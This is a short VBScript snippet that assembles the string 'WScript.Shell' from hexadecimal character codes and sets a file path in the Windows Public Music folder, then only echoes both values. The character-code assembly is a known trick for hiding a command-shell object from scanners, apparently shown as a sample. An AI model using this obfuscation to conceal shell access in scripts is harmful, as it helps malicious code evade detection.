Function HexWord(a, b, c)
    HexWord = Chr(a) & Chr(b) & Chr(c)
End Function
obj = HexWord(&H57, &H53, &H63) & HexWord(&H72, &H69, &H70) & HexWord(&H74, &H2E, &H53) & "hell"
path = "C:\Users\Public\Music\cache.txt"
WScript.Echo obj
WScript.Echo path
